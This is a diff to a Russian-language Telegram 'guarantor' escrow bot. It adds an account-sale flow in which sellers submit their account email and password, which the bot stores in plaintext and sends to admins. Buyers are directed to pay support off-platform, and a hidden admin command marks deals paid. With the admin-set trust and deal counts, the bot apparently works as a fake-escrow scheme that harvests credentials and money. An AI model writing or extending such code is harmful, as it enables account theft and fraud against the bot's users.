@@ -82,6 +82,10 @@ def init_db():
         conn.execute("ALTER TABLE users ADD COLUMN trust_score TEXT DEFAULT '—'")
     if not column_exists("users", "accepted"):
         conn.execute("ALTER TABLE users ADD COLUMN accepted INTEGER DEFAULT 0")
+    if not column_exists("deals", "account_creds"):
+        conn.execute("ALTER TABLE deals ADD COLUMN account_creds TEXT DEFAULT ''")
+    if not column_exists("deals", "creds_confirmed"):
+        conn.execute("ALTER TABLE deals ADD COLUMN creds_confirmed INTEGER DEFAULT 0")
 
     conn.commit()
     conn.close()
@@ -123,7 +127,7 @@ def get_payments(user_id: int) -> list[dict]:
 def add_payment(user_id: int, ptype: str, value: str, bank: str = "") -> bool:
     conn = sqlite3.connect(DB_PATH)
     count = conn.execute("SELECT COUNT(*) FROM payments WHERE user_id = ?", (user_id,)).fetchone()[0]
-    if count >= 2:
+    if count >= MAX_PAYMENT_METHODS:
         conn.close()
         return False
     try:
@@ -179,6 +183,73 @@ def attach_seller_to_deal(code: str, seller_id: int) -> dict | None:
     conn.close()
     return get_deal_by_code(code)
 
+def attach_buyer_to_account_deal(code: str, buyer_id: int) -> dict | None:
+    """Для сделок категории 'account': фиксирует покупателя (хранится как seller_id в БД)."""
+    deal = get_deal_by_code(code)
+    if not deal:
+        return None
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute(
+        "UPDATE deals SET seller_id = ?, status = 'account_pending_creds' WHERE id = ?",
+        (buyer_id, deal["id"])
+    )
+    conn.commit()
+    conn.close()
+    return get_deal_by_code(code)
+
+def set_account_creds(code: str, creds: str) -> dict | None:
+    deal = get_deal_by_code(code)
+    if not deal:
+        return None
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute(
+        "UPDATE deals SET account_creds = ?, status = 'account_pending_review' WHERE id = ?",
+        (creds, deal["id"])
+    )
+    conn.commit()
+    conn.close()
+    return get_deal_by_code(code)
+
+def confirm_account_creds(code: str) -> dict | None:
+    deal = get_deal_by_code(code)
+    if not deal:
+        return None
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute(
+        "UPDATE deals SET creds_confirmed = 1, status = 'account_pending_payment' WHERE id = ?",
+        (deal["id"],)
+    )
+    conn.commit()
+    conn.close()
+    return get_deal_by_code(code)
+
+def get_latest_account_deal_for_admin() -> dict | None:
+    """Последняя сделка с аккаунтом, ожидающая проверки данных админом."""
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    row = conn.execute(
+        "SELECT * FROM deals WHERE status = 'account_pending_review' ORDER BY id DESC LIMIT 1"
+    ).fetchone()
+    conn.close()
+    return dict(row) if row else None
+
+def get_latest_account_deal_for_buyer_payment(uid: int) -> dict | None:
+    """Сделка с аккаунтом, где этот пользователь — покупатель, ожидающая его оплаты."""
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    row = conn.execute(
+        "SELECT * FROM deals WHERE seller_id = ? AND status = 'account_pending_payment' ORDER BY id DESC LIMIT 1",
+        (uid,)
+    ).fetchone()
+    conn.close()
+    return dict(row) if row else None
+
+def mark_account_deal_paid(code: str):
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute("UPDATE deals SET status = 'account_paid' WHERE deal_code = ?", (code,))
+    conn.commit()
+    conn.close()
+
 # ============================================================
 # Вспомогательные функции
 # ============================================================
@@ -205,14 +276,16 @@ def luhn_check(card: str) -> bool:
 def mask_card(n: str) -> str:
     return f"{n[:4]} **** **** {n[-4:]}"
 
-PAYMENT_LABELS = {"card": "💳 Карта", "sbp": "📱 СБП", "crypto": "🪙 CryptoBot"}
-CURRENCY_LABELS = {"RUB": "🇷🇺 Рубли (RUB)", "TON": "💎 TON"}
+PAYMENT_LABELS = {"card": "💳 Карта", "sbp": "📱 СБП", "crypto": "🪙 CryptoBot", "stars": "⭐ Звёзды"}
+CURRENCY_LABELS = {"RUB": "🇷🇺 Рубли (RUB)", "TON": "💎 TON", "STARS": "⭐ Звёзды (STARS)"}
+MAX_PAYMENT_METHODS = 3
 
 # ============================================================
 # Состояния
 # ============================================================
 CARD_NUM, CARD_BANK, SBP_PHONE, SBP_BANK = range(4)
 CAT, ITEM_NAME, ITEM_DESC, CURRENCY, AMOUNT, CONFIRM = range(10, 16)
+ACC_CREDS = 20
 
 # ============================================================
 # Клавиатуры
@@ -250,7 +323,7 @@ def payments_kb(payments: list[dict]):
         elif p["type"] == "sbp":
             label += f" {p['value']}"
         rows.append([btn(label, f"manage_{p['type']}", style="primary")])
-    if len(payments) < 2:
+    if len(payments) < MAX_PAYMENT_METHODS:
         rows.append([btn("➕ Добавить способ оплаты", "add_payment", style="success")])
     rows.append([btn("⬅️ Назад", "back_main", style="primary")])
     return InlineKeyboardMarkup(rows)
@@ -270,6 +343,8 @@ def payment_methods_kb(existing: list[dict]):
         rows.append([btn("📱 СБП (по номеру)", "pay_sbp", style="primary")])
     if "crypto" not in existing_types:
         rows.append([btn("🪙 CryptoBot", "pay_crypto", style="primary")])
+    if "stars" not in existing_types:
+        rows.append([btn("⭐ Звёзды", "pay_stars", style="primary")])
     rows.append([btn("⬅️ Назад", "payments", style="primary")])
     return InlineKeyboardMarkup(rows)
 
@@ -282,6 +357,8 @@ def deal_payment_methods_kb(existing: list[dict], deal_code: str):
         rows.append([btn("📱 СБП (по номеру)", f"deal_pay_sbp_{deal_code}", style="primary")])
     if "crypto" not in existing_types:
         rows.append([btn("🪙 CryptoBot", f"deal_pay_crypto_{deal_code}", style="primary")])
+    if "stars" not in existing_types:
+        rows.append([btn("⭐ Звёзды", f"deal_pay_stars_{deal_code}", style="primary")])
     return InlineKeyboardMarkup(rows)
 
 def back_kb(target="back_main"):
@@ -300,6 +377,7 @@ def currency_kb():
     return InlineKeyboardMarkup([
         [btn("🇷🇺 Рубли (RUB)", "cur_RUB", style="primary")],
         [btn("💎 TON", "cur_TON", style="primary")],
+        [btn("⭐ Звёзды (STARS)", "cur_STARS", style="primary")],
         [btn("⬅️ Отмена", "back_main", style="primary")],
     ])
 
@@ -342,6 +420,16 @@ def deal_offer_kb(code: str):
 def no_requisites_kb(code: str):
     return InlineKeyboardMarkup([
         [btn("➕ Добавить реквизиты", f"deal_add_req_{code}", style="success")],
+    ])
+
+def account_offer_kb(code: str):
+    return InlineKeyboardMarkup([
+        [btn("✅ Подтвердить участие", f"acc_buyer_confirm_{code}", style="success")],
+    ])
+
+def account_creds_admin_kb(code: str):
+    return InlineKeyboardMarkup([
+        [btn("✅ Подтвердить данные", f"acc_admin_confirm_{code}", style="success")],
     ])
 
 # ============================================================
@@ -397,6 +485,17 @@ def deal_offer_text(deal: dict) -> str:
         f"После подтверждения покупатель получит уведомление и сможет оплатить.</blockquote>"
     )
 
+def account_offer_text(deal: dict) -> str:
+    return (
+        f"<b>📄 Вам предложена покупка аккаунта</b>\n\n"
+        f"<b>👤 Аккаунт:</b> {esc(deal['item_name'])}\n"
+        f"<b>📝 Описание:</b> {esc(deal['description'])}\n"
+        f"<b>💰 Сумма:</b> <code>{deal['amount']} {deal['currency']}</code>\n\n"
+        f"<blockquote>Нажмите кнопку ниже, чтобы подтвердить участие. "
+        f"Продавец предоставит данные от аккаунта поддержке для проверки, и после подтверждения "
+        f"вам нужно будет оплатить сделку гаранту.</blockquote>"
+    )
+
 def no_requisites_text(deal: dict) -> str:
     return (
         f"<b>⚠️ У вас не добавлены реквизиты</b>\n\n"
@@ -414,7 +513,30 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if args and args[0].startswith("deal_"):
         code = args[0].replace("deal_", "")
         deal = get_deal_by_code(code)
-        if not deal or deal["status"] not in ("pending_seller", "pending_payment"):
+        if not deal:
+            await update.message.reply_text("❌ Сделка не найдена или уже обработана.")
+            return
+
+        if deal["category"] == "account":
+            if deal["status"] != "account_pending_buyer":
+                await update.message.reply_text("❌ Сделка не найдена или уже обработана.")
+                return
+            if update.effective_user.id == deal["creator_id"]:
+                await update.message.reply_text(
+                    "⚠️ <b>Это ваша собственная сделка.</b>\n\n"
+                    "<blockquote>Ссылка предназначена для покупателя. "
+                    "Отправьте её тому, кто будет покупать аккаунт.</blockquote>",
+                    parse_mode="HTML"
+                )
+                return
+            await update.message.reply_text(
+                account_offer_text(deal),
+                reply_markup=account_offer_kb(code),
+                parse_mode="HTML"
+            )
+            return
+
+        if deal["status"] not in ("pending_seller", "pending_payment"):
             await update.message.reply_text("❌ Сделка не найдена или уже обработана.")
             return
 
@@ -505,8 +627,8 @@ async def deal_add_req(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer("Сделка не найдена", show_alert=True)
         return
     payments = get_payments(q.from_user.id)
-    if len(payments) >= 2:
-        await q.answer("Уже добавлено 2 способа оплаты", show_alert=True)
+    if len(payments) >= MAX_PAYMENT_METHODS:
+        await q.answer("Достигнут лимит способов оплаты", show_alert=True)
         return
     context.user_data["deal_req_code"] = code
     await q.message.edit_text(
@@ -565,6 +687,26 @@ async def deal_pay_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML"
     )
 
+async def deal_pay_stars(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    code = q.data.replace("deal_pay_stars_", "")
+    uid = q.from_user.id
+    if add_payment(uid, "stars", "", ""):
+        await q.answer("⭐ Оплата звёздами подключена", show_alert=True)
+    else:
+        await q.answer("Не удалось добавить (лимит или дубликат)", show_alert=True)
+        return
+    deal = attach_seller_to_deal(code, uid)
+    if not deal:
+        await q.message.edit_text("❌ Сделка не найдена.")
+        return
+    await q.message.edit_text(
+        deal_offer_text(deal),
+        reply_markup=deal_offer_kb(code),
+        parse_mode="HTML"
+    )
+
 # ============================================================
 # Создание сделки
 # ============================================================
@@ -590,7 +732,12 @@ async def cat_chosen(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "nft": "<b>🖼 NFT</b>\n\n<blockquote>Введите название NFT. Можно вставить ссылку на маркетплейс — она будет сохранена как название.</blockquote>",
         "stars": "<b>⭐ Звёзды</b>\n\n<blockquote>Введите количество звёзд (только число).</blockquote>",
         "service": "<b>🛠 Услуга</b>\n\n<blockquote>Введите название услуги.</blockquote>",
-        "account": "<b>👤 Аккаунты</b>\n\n<blockquote>Введите, какой именно аккаунт (платформа, логин/ссылка и т.д.).</blockquote>",
+        "account": (
+            "<b>👤 Аккаунты</b>\n\n"
+            "<blockquote expandable>⚠️ Эта категория только для продавцов — создавайте сделку, "
+            "если продаёте свой аккаунт. Ссылка на сделку будет предназначена для покупателя.</blockquote>\n\n"
+            "<blockquote>Введите, какой именно аккаунт (платформа, логин/ссылка и т.д.).</blockquote>"
+        ),
     }
     await q.message.delete()
     await q.message.chat.send_message(prompts[cat], parse_mode="HTML")
@@ -669,15 +816,27 @@ async def amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def _show_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     d = context.user_data
+    if d.get("deal_cat") == "account":
+        note = (
+            "<blockquote expandable>⚠️ Категория «Аккаунты» доступна только продавцам — "
+            "создавайте такую сделку, если продаёте свой аккаунт.\n\n"
+            "После создания вы получите ссылку для покупателя. Покупатель перейдёт по ней "
+            "и подтвердит участие, после чего вам нужно будет предоставить данные от аккаунта "
+            "(почту и пароль) для проверки поддержкой. Если что-то не так — нажмите «Изменить».</blockquote>"
+        )
+    else:
+        note = (
+            "<blockquote expandable>После создания вы получите ссылку для продавца. "
+            "Продавец перейдёт по ней, подтвердит участие, и вы сможете оплатить. "
+            "Если что-то не так — нажмите «Изменить».</blockquote>"
+        )
     summary = (
         f"<b>📋 Проверьте сделку</b>\n\n"
         f"<b>Категория:</b> {d['deal_cat'].upper()}\n"
         f"<b>Товар:</b> {esc(d['deal_item'])}\n"
         f"<b>Описание:</b>\n<blockquote>{esc(d['deal_desc'])}</blockquote>\n"
         f"<b>Сумма:</b> <code>{d['deal_amount']} {d['deal_currency']}</code>\n\n"
-        f"<blockquote expandable>После создания вы получите ссылку для продавца. "
-        f"Продавец перейдёт по ней, подтвердит участие, и вы сможете оплатить. "
-        f"Если что-то не так — нажмите «Изменить».</blockquote>"
+        f"{note}"
     )
     if update.callback_query:
         await update.callback_query.message.edit_text(summary, reply_markup=deal_confirm_kb(), parse_mode="HTML")
@@ -722,30 +881,46 @@ async def confirm_deal(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await q.answer()
     d = context.user_data
     uid = q.from_user.id
+    is_account = d["deal_cat"] == "account"
     code = secrets.token_urlsafe(8)
+    init_status = "account_pending_buyer" if is_account else "pending_seller"
     conn = sqlite3.connect(DB_PATH)
     conn.execute(
-        "INSERT INTO deals (deal_code, creator_id, category, item_name, item_link, description, amount, currency) "
-        "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-        (code, uid, d["deal_cat"], d["deal_item"], d.get("deal_item", ""), d["deal_desc"], d["deal_amount"], d["deal_currency"])
+        "INSERT INTO deals (deal_code, creator_id, category, item_name, item_link, description, amount, currency, status) "
+        "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
+        (code, uid, d["deal_cat"], d["deal_item"], d.get("deal_item", ""), d["deal_desc"], d["deal_amount"], d["deal_currency"], init_status)
     )
     conn.commit()
     conn.close()
     bot_username = (await context.bot.get_me()).username
     link = f"https://t.me/{bot_username}?start=deal_{code}"
     await q.message.delete()
-    await q.message.chat.send_message(
-        f"<b>✅ Сделка создана!</b>\n\n"
-        f"<b>Код:</b> <code>{code}</code>\n"
-        f"<b>Товар:</b> {esc(d['deal_item'])}\n"
-        f"<b>Сумма:</b> <code>{d['deal_amount']} {d['deal_currency']}</code>\n\n"
-        f"<b>🔗 Ссылка для продавца:</b>\n"
-        f"<pre>{esc(link)}</pre>\n\n"
-        f"<blockquote expandable>Отправьте эту ссылку продавцу. "
-        f"После того как он подтвердит участие, вы получите уведомление с реквизитами для оплаты. "
-        f"Не передавайте ссылку третьим лицам.</blockquote>",
-        parse_mode="HTML"
-    )
+    if is_account:
+        await q.message.chat.send_message(
+            f"<b>✅ Сделка создана!</b>\n\n"
+            f"<b>Код:</b> <code>{code}</code>\n"
+            f"<b>Аккаунт:</b> {esc(d['deal_item'])}\n"
+            f"<b>Сумма:</b> <code>{d['deal_amount']} {d['deal_currency']}</code>\n\n"
+            f"<b>🔗 Ссылка для покупателя:</b>\n"
+            f"<pre>{esc(link)}</pre>\n\n"
+            f"<blockquote expandable>Отправьте эту ссылку покупателю. "
+            f"После того как он подтвердит участие, бот попросит вас предоставить данные от аккаунта "
+            f"(почту и пароль) для проверки. Не передавайте ссылку третьим лицам.</blockquote>",
+            parse_mode="HTML"
+        )
+    else:
+        await q.message.chat.send_message(
+            f"<b>✅ Сделка создана!</b>\n\n"
+            f"<b>Код:</b> <code>{code}</code>\n"
+            f"<b>Товар:</b> {esc(d['deal_item'])}\n"
+            f"<b>Сумма:</b> <code>{d['deal_amount']} {d['deal_currency']}</code>\n\n"
+            f"<b>🔗 Ссылка для продавца:</b>\n"
+            f"<pre>{esc(link)}</pre>\n\n"
+            f"<blockquote expandable>Отправьте эту ссылку продавцу. "
+            f"После того как он подтвердит участие, вы получите уведомление с реквизитами для оплаты. "
+            f"Не передавайте ссылку третьим лицам.</blockquote>",
+            parse_mode="HTML"
+        )
     return ConversationHandler.END
 
 # ============================================================
@@ -856,8 +1031,139 @@ async def check_deal_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await q.answer("Сделка не найдена", show_alert=True)
         return
     status_map = {"pending_seller": "Ожидает продавца", "pending_payment": "Ожидает оплаты",
-                  "seller_confirmed": "Продавец подтвердил", "paid": "Оплачено", "completed": "Завершена"}
+                  "seller_confirmed": "Продавец подтвердил", "paid": "Оплачено", "completed": "Завершена",
+                  "account_pending_buyer": "Ожидает покупателя", "account_pending_creds": "Ожидает данные от продавца",
+                  "account_pending_review": "Данные на проверке у поддержки", "account_pending_payment": "Ожидает оплаты покупателем",
+                  "account_paid": "Оплачено, аккаунт передаётся"}
     await q.answer(f"Статус: {status_map.get(deal['status'], deal['status'])}", show_alert=True)
+
+# ============================================================
+# Сделки с аккаунтами (продавец → покупатель → проверка поддержкой → оплата)
+# ============================================================
+async def account_buyer_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer("Вы подтвердили участие")
+    code = q.data.replace("acc_buyer_confirm_", "")
+    deal = get_deal_by_code(code)
+    if not deal or deal["category"] != "account" or deal["status"] != "account_pending_buyer":
+        await q.message.edit_text("❌ Сделка не найдена или уже обработана.")
+        return
+    buyer_id = q.from_user.id
+    attach_buyer_to_account_deal(code, buyer_id)
+    await q.message.edit_text(
+        "✅ Вы подтвердили участие. Ожидайте — продавец предоставит данные от аккаунта поддержке "
+        "для проверки, после чего вам придёт запрос на оплату."
+    )
+    await context.bot.send_message(
+        deal["creator_id"],
+        f"🔔 <b>Покупатель подтвердил участие в сделке!</b>\n\n"
+        f"<b>Аккаунт:</b> {esc(deal['item_name'])}\n"
+        f"<b>Сумма:</b> <code>{deal['amount']} {deal['currency']}</code>\n\n"
+        f"<blockquote>Пожалуйста, предоставьте поддержке данные от аккаунта (почту и пароль) "
+        f"для проверки. Отправьте их следующим сообщением сюда, в формате:\n"
+        f"<code>почта:пароль</code></blockquote>",
+        parse_mode="HTML"
+    )
+    context.bot_data.setdefault("awaiting_creds", {})[deal["creator_id"]] = code
+
+async def account_creds_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    awaiting = context.bot_data.get("awaiting_creds", {})
+    code = awaiting.get(uid)
+    if not code:
+        return
+    deal = get_deal_by_code(code)
+    if not deal or deal["creator_id"] != uid or deal["status"] != "account_pending_creds":
+        awaiting.pop(uid, None)
+        return
+    creds = update.message.text.strip()
+    set_account_creds(code, creds)
+    awaiting.pop(uid, None)
+    await update.message.reply_text(
+        "✅ <b>Данные отправлены поддержке на проверку.</b>\n\n"
+        "<blockquote>Как только поддержка всё проверит, вам и покупателю придёт уведомление, "
+        "и сделка перейдёт к оплате.</blockquote>",
+        parse_mode="HTML"
+    )
+    deal = get_deal_by_code(code)
+    for admin_id in ADMIN_IDS:
+        try:
+            await context.bot.send_message(
+                admin_id,
+                f"🆘 <b>Новые данные аккаунта на проверку</b>\n\n"
+                f"<b>Код сделки:</b> <code>{deal['deal_code']}</code>\n"
+                f"<b>Аккаунт:</b> {esc(deal['item_name'])}\n"
+                f"<b>Описание:</b> {esc(deal['description'])}\n"
+                f"<b>Сумма:</b> <code>{deal['amount']} {deal['currency']}</code>\n\n"
+                f"<b>🔑 Данные (почта:пароль):</b>\n<pre>{esc(deal['account_creds'])}</pre>\n\n"
+                f"<blockquote>Проверьте доступ к аккаунту. Если всё в порядке — нажмите «Подтвердить данные».</blockquote>",
+                reply_markup=account_creds_admin_kb(deal["deal_code"]),
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            logger.warning(f"Не удалось уведомить админа {admin_id}: {e}")
+
+async def account_admin_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    if q.from_user.id not in ADMIN_IDS:
+        await q.answer("❌ У вас нет доступа.", show_alert=True)
+        return
+    await q.answer("Данные подтверждены")
+    code = q.data.replace("acc_admin_confirm_", "")
+    deal = get_deal_by_code(code)
+    if not deal or deal["status"] != "account_pending_review":
+        await q.message.edit_text("❌ Сделка не найдена или уже обработана.")
+        return
+    confirm_account_creds(code)
+    await q.message.edit_text(
+        f"✅ Данные по сделке <code>{code}</code> подтверждены. Ожидаем оплату покупателя.",
+        parse_mode="HTML"
+    )
+    await context.bot.send_message(
+        deal["creator_id"],
+        "✅ <b>Поддержка подтвердила данные аккаунта.</b>\n\n"
+        "<blockquote>Ждём, пока покупатель оплатит сделку. Как только оплата поступит, "
+        "вы получите уведомление.</blockquote>",
+        parse_mode="HTML"
+    )
+    await context.bot.send_message(
+        deal["seller_id"],
+        f"✅ <b>Поддержка подтвердила данные аккаунта!</b>\n\n"
+        f"<b>Аккаунт:</b> {esc(deal['item_name'])}\n"
+        f"<b>Сумма к оплате:</b> <code>{deal['amount']} {deal['currency']}</code>\n\n"
+        f"<blockquote>Свяжитесь с поддержкой ({SUPPORT_URL}) для оплаты сделки гаранту. "
+        f"После оплаты вы получите доступ к аккаунту (почту и пароль).</blockquote>",
+        parse_mode="HTML"
+    )
+
+async def account_mark_paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Скрытая команда для админов: подтвердить, что покупатель оплатил сделку с аккаунтом."""
+    if update.effective_user.id not in ADMIN_IDS:
+        return
+    args = context.args
+    if not args:
+        await update.message.reply_text("Использование: /accpaid <код_сделки>")
+        return
+    code = args[0]
+    deal = get_deal_by_code(code)
+    if not deal or deal["category"] != "account" or deal["status"] != "account_pending_payment":
+        await update.message.reply_text("❌ Сделка не найдена или не ожидает оплаты.")
+        return
+    mark_account_deal_paid(code)
+    await context.bot.send_message(
+        deal["seller_id"],
+        f"🔑 <b>Оплата получена! Данные от аккаунта:</b>\n\n"
+        f"<pre>{esc(deal['account_creds'])}</pre>\n\n"
+        f"<blockquote>Сделка завершена. Приятного использования!</blockquote>",
+        parse_mode="HTML"
+    )
+    await context.bot.send_message(
+        deal["creator_id"],
+        f"💰 <b>Покупатель оплатил сделку по аккаунту «{esc(deal['item_name'])}».</b>\n\n"
+        f"<blockquote>Средства будут переведены вам по оговорённым реквизитам. Сделка завершена.</blockquote>",
+        parse_mode="HTML"
+    )
+    await update.message.reply_text(f"✅ Сделка {code} закрыта, обе стороны уведомлены.")
 
 # ============================================================
 # Админ-панель
@@ -991,8 +1297,10 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             detail = f"<b>💳 Карта:</b> <code>{mask_card(p['value'])}</code>\n<b>🏦 Банк:</b> {esc(p['bank'])}"
         elif ptype == "sbp":
             detail = f"<b>📱 СБП:</b> <code>{esc(p['value'])}</code>\n<b>🏦 Банк:</b> {esc(p['bank'])}"
-        else:
+        elif ptype == "crypto":
             detail = "<b>🪙 CryptoBot</b> подключён"
+        else:
+            detail = "<b>⭐ Оплата звёздами</b> подключена"
         await q.message.delete()
         await q.message.chat.send_message(
             f"<b>{PAYMENT_LABELS[ptype]}</b>\n\n{detail}",
@@ -1018,26 +1326,40 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif d == "add_payment":
         payments = get_payments(uid)
-        if len(payments) >= 2:
-            await q.answer("Максимум 2 способа оплаты", show_alert=True)
+        if len(payments) >= MAX_PAYMENT_METHODS:
+            await q.answer("Достигнут лимит способов оплаты", show_alert=True)
             return
         await q.message.delete()
         await q.message.chat.send_message(
             "<b>Выберите способ оплаты:</b>\n\n"
             "💳 <b>Карта</b> — номер карты (Visa/MasterCard/МИР) и банк.\n"
             "📱 <b>СБП</b> — номер телефона и банк.\n"
-            "🪙 <b>CryptoBot</b> — подключение в один клик.",
+            "🪙 <b>CryptoBot</b> — подключение в один клик.\n"
+            "⭐ <b>Звёзды</b> — подключение в один клик.",
             reply_markup=payment_methods_kb(payments), parse_mode="HTML")
 
     elif d == "pay_crypto":
         payments = get_payments(uid)
-        if len(payments) >= 2:
-            await q.answer("Максимум 2 способа", show_alert=True)
+        if len(payments) >= MAX_PAYMENT_METHODS:
+            await q.answer("Достигнут лимит способов оплаты", show_alert=True)
             return
         if add_payment(uid, "crypto", "", ""):
             await q.answer("CryptoBot подключён", show_alert=True)
         else:
             await q.answer("CryptoBot уже добавлен", show_alert=True)
+        payments = get_payments(uid)
+        await q.message.delete()
+        await q.message.chat.send_message("<b>💳 Способы оплаты</b>", reply_markup=payments_kb(payments), parse_mode="HTML")
+
+    elif d == "pay_stars":
+        payments = get_payments(uid)
+        if len(payments) >= MAX_PAYMENT_METHODS:
+            await q.answer("Достигнут лимит способов оплаты", show_alert=True)
+            return
+        if add_payment(uid, "stars", "", ""):
+            await q.answer("⭐ Оплата звёздами подключена", show_alert=True)
+        else:
+            await q.answer("Оплата звёздами уже добавлена", show_alert=True)
         payments = get_payments(uid)
         await q.message.delete()
         await q.message.chat.send_message("<b>💳 Способы оплаты</b>", reply_markup=payments_kb(payments), parse_mode="HTML")
@@ -1237,12 +1559,17 @@ def main():
     app.add_handler(deal_conv)
     app.add_handler(card_conv)
     app.add_handler(sbp_conv)
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_input))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, account_creds_received), group=0)
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_input), group=1)
     app.add_handler(CallbackQueryHandler(deal_add_req, pattern="^deal_add_req_"))
     app.add_handler(CallbackQueryHandler(deal_pay_crypto, pattern="^deal_pay_crypto_"))
+    app.add_handler(CallbackQueryHandler(deal_pay_stars, pattern="^deal_pay_stars_"))
     app.add_handler(CallbackQueryHandler(seller_info_handler, pattern="^seller_info_"))
     app.add_handler(CallbackQueryHandler(seller_confirm, pattern="^seller_confirm_"))
     app.add_handler(CallbackQueryHandler(check_deal_handler, pattern="^check_deal_"))
+    app.add_handler(CallbackQueryHandler(account_buyer_confirm, pattern="^acc_buyer_confirm_"))
+    app.add_handler(CallbackQueryHandler(account_admin_confirm, pattern="^acc_admin_confirm_"))
+    app.add_handler(CommandHandler("accpaid", account_mark_paid))
     app.add_handler(CallbackQueryHandler(admin_set_deals, pattern="^admin_set_deals$"))
     app.add_handler(CallbackQueryHandler(admin_set_trust, pattern="^admin_set_trust$"))
     app.add_handler(CallbackQueryHandler(menu_router))
